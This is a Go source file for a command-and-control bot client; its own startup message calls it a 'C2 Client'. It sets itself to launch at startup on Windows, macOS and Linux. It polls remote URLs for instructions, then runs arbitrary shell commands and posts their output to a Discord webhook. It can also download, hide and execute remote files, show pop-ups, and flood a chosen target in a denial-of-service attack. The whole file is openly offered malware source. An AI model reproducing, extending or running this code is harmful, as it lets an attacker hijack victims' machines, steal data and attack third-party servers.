package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// isAdmin checks if the current user has admin privileges
func isAdmin() (bool, error) {
	switch runtime.GOOS {
	case "windows":
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		if err != nil {
			if strings.Contains(err.Error(), "Access is denied") {
				return false, nil
			}
			return false, err
		}
		return true, nil
	case "linux", "darwin":
		if os.Geteuid() != 0 {
			return false, nil
		}
		return true, nil
	default:
		return false, nil
	}
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	err = os.WriteFile(dst, input, 0644)
	return err
}

// AutostartOnWin adds the executable to the Windows startup folder
func AutostartOnWin(executablePath string) {
	var startupPath string
	admin, err := isAdmin()
	if err != nil || !admin {
		return
	}
	startupPath = filepath.Join(os.Getenv("ProgramData"), "Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
	destPath := filepath.Join(startupPath, filepath.Base(executablePath))
	copyFile(executablePath, destPath)
}

// autostartOnLinuxAndDarwin adds the executable to the autostart directory on Linux and Darwin
func autostartOnLinuxAndDarwin(executablePath string) {
	var autostartDir string
	admin, err := isAdmin()
	if err != nil || !admin {
		return
	}

	switch runtime.GOOS {
	case "darwin":
		autostartDir = "/Library/LaunchAgents"
	case "linux":
		autostartDir = "/etc/xdg/autostart"
	default:
		return
	}

	os.MkdirAll(autostartDir, 0755)
	destPath := filepath.Join(autostartDir, filepath.Base(executablePath))
	os.Symlink(executablePath, destPath)
}

// runAtStartup adds the executable to the autostart directory depending on the OS
func runAtStartup() {
	executable, err := os.Executable()
	if err != nil {
		return
	}
	if runtime.GOOS == "windows" {
		AutostartOnWin(executable)
	} else {
		autostartOnLinuxAndDarwin(executable)
	}
}

// Config holds the configuration for the program
type Config struct {
	URL        string   `json:"url"`
	BackupURLs []string `json:"backups"`
	WebhookURL string   `json:"webhookURL"`
}

// SendDiscordWebhook sends a message to the specified Discord webhook URL
func SendDiscordWebhook(webhookURL, message string) error {
	if webhookURL == "" {
		return nil
	}

	payload := map[string]string{
		"content": message,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %w", err)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("webhook request failed: %w", err)
	}
	defer resp.Body.Close()

	// Discord returns 204 No Content on success
	if resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusOK {
		// Handle rate limiting
		if retryAfter := resp.Header.Get("Retry-After"); retryAfter != "" {
			var seconds int
			fmt.Sscanf(retryAfter, "%d", &seconds)
			if seconds > 0 {
				time.Sleep(time.Duration(seconds+1) * time.Second)
			}
		}
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	return fmt.Errorf("webhook failed with status %d: %s", resp.StatusCode, string(body))
}

// downloadFile downloads a file from a URL and saves it to a local file
func downloadFile(url, filename string, run, hide bool) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("download failed with status %d", resp.StatusCode)
	}

	out, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	if hide {
		if runtime.GOOS == "windows" {
			exec.Command("attrib", "+H", filename).Run()
		} else {
			os.Rename(filename, "."+filename)
			filename = "." + filename
		}
	}
	if run {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", "start", filename)
		} else {
			os.Chmod(filename, 0755)
			cmd = exec.Command("./" + filename)
		}
		cmd.Run()
	}

	return nil
}

// displayMessageInHTML creates a temporary HTML file and displays a message in it
func displayMessageInHTML(message string) {
	tmpfile, err := os.CreateTemp("", "message-*.html")
	if err != nil {
		return
	}
	defer tmpfile.Close()

	htmlContent := fmt.Sprintf("<html><body><p>%s</p></body></html>", message)
	tmpfile.Write([]byte(htmlContent))
	openBrowser(tmpfile.Name())
}

// openBrowser opens a URL in the default browser
func openBrowser(url string) {
	var err error
	switch runtime.GOOS {
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "windows":
		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	default:
		err = fmt.Errorf("unsupported platform")
	}
	if err != nil {
		return
	}
}

// LoadConfig loads the configuration from a JSON file
func LoadConfig(path string) (*Config, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var config Config
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&config)
	if err != nil {
		return nil, err
	}

	return &config, nil
}

// FetchCommand fetches a command from a URL
func FetchCommand(config *Config) (string, error) {
	urls := append([]string{config.URL}, config.BackupURLs...)
	for _, url := range urls {
		resp, err := http.Get(url + "?nocache=" + generateRandomString(20))
		if err == nil && resp.StatusCode == http.StatusOK {
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			return string(body), nil
		}
	}
	return "", nil
}

// generateRandomString generates a random string of a given length
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// DOS performs a Denial of Service attack on a target
func DOS(target string, port string, duration time.Duration) {
	endTime := time.Now().Add(duration)
	var wg sync.WaitGroup

	send := func() {
		defer wg.Done()
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
		if err != nil {
			return
		}
		defer conn.Close()
		conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
	}

	for time.Now().Before(endTime) {
		wg.Add(1)
		go send()
		time.Sleep(10 * time.Millisecond)
	}
	wg.Wait()
}

// executeSystemCommand executes a system command and returns its output
func executeSystemCommand(name string, args []string) (string, error) {
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", nil
	}
	return out.String(), nil
}

// ParseCommand parses a command and performs the corresponding action
func ParseCommand(command string, config *Config) error {
	commands := strings.Split(command, "\n")
	for _, cmd := range commands {
		parts := strings.Fields(cmd)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "popmsg":
			if len(parts) > 1 {
				message := strings.Join(parts[1:], " ")
				displayMessageInHTML(message)
				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("📢 Pop-up message sent:\n```\n%s\n```", message))
			}
		case "download":
			if len(parts) >= 3 {
				url := parts[1]
				filename := parts[2]

				run := false
				hide := false
				for _, part := range parts[3:] {
					if part == "RUN" {
						run = true
					} else if part == "HIDE" {
						hide = true
					}
				}

				err := downloadFile(url, filename, run, hide)
				status := "✅ Success"
				if err != nil {
					status = fmt.Sprintf("❌ Failed: %v", err)
				}
				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("📥 Download `%s` from `%s`\nStatus: `%s`", filename, url, status))
			}
		case "cmd":
			if len(parts) > 1 {
				output, err := executeSystemCommand(parts[1], parts[2:])
				status := "✅ Success"
				if err != nil {
					status = fmt.Sprintf("❌ Error: %v", err)
				}
				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("💻 Command `%s` executed\nOutput:\n```\n%s\n```Status: `%s`", strings.Join(parts[1:], " "), output, status))
			}
		case "dos":
			if len(parts) < 4 {
				continue
			}
			target := parts[1]
			port := parts[2]
			durationStr := parts[3]

			duration, err := time.ParseDuration(durationStr)
			if err != nil {
				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("⚠️ Invalid duration format: `%s`", durationStr))
				continue
			}

			SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("🌊 Starting DOS attack on `%s:%s` for `%s`...", target, port, durationStr))
			DOS(target, port, duration)
			SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("✅ DOS attack completed on `%s:%s`", target, port))
		default:
			if strings.HasPrefix(cmd, "dos ") {
				info := strings.TrimSpace(strings.TrimPrefix(cmd, "dos "))
				parts := strings.Fields(info)
				if len(parts) < 3 {
					continue
				}

				target := parts[0]
				port := parts[1]
				durationStr := parts[2]

				duration, err := time.ParseDuration(durationStr + "s")
				if err != nil {
					SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("⚠️ Invalid duration format: `%ss`", durationStr))
					continue
				}

				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("🌊 Starting DOS attack on `%s:%s` for `%ss`...", target, port, durationStr))
				DOS(target, port, duration)
				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf("✅ DOS attack completed on `%s:%s`", target, port))
			}
		}
	}
	return nil
}

// main is the entry point of the program
func main() {
	runAtStartup()
	rand.Seed(time.Now().UnixNano())

	config, err := LoadConfig("config.json")
	if err != nil {
		os.Exit(1)
	}

	SendDiscordWebhook(config.WebhookURL, "🟢 C2 Client started successfully.")

	for {
		command, err := FetchCommand(config)
		if err != nil {
			time.Sleep(60 * time.Second)
			continue
		}

		ParseCommand(command, config)

		time.Sleep(60 * time.Second)
	}
}
